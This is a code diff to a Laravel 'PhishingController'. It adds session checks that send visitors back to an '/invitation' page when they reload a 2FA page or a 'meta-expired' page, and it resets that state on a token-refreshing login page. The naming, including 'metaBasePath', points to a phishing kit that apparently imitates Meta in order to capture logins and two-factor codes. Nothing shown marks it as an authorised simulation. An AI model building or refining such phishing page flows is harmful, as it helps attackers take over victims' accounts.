@@ -121,7 +121,13 @@ class PhishingController extends Controller
             return abort(404);
         }
 
-        // Referer check removed to prevent blocking legitimate flows or testers
+        // If page is refreshed/reloaded, redirect back to /invitation
+        if (session()->has('_2fa_loaded')) {
+            session()->forget('_2fa_loaded');
+            return redirect('/invitation');
+        }
+
+        session(['_2fa_loaded' => true]);
 
         return view('2fa1', [
             'metaBasePath' => $session['metaBasePath']
@@ -146,6 +152,15 @@ class PhishingController extends Controller
             return abort(404);
         }
 
+        // If meta-expired page is refreshed/reloaded, redirect back to /invitation
+        if ($templates[$page] === "meta-expired") {
+            if (session()->has('_meta_expired_loaded')) {
+                session()->forget('_meta_expired_loaded');
+                return redirect('/invitation');
+            }
+            session(['_meta_expired_loaded' => true]);
+        }
+
         return view($templates[$page], ['metaBasePath' => $session['metaBasePath']]);
     }
 
@@ -162,6 +177,7 @@ class PhishingController extends Controller
 
     public function showLogin2v2(Request $request)
     {
+        session()->forget('_2fa_loaded');
         $session = $this->getSessionData();
         // Always refresh token on each visit
         if (!session('_lv2_token') || $request->query('token') !== session('_lv2_token')) {
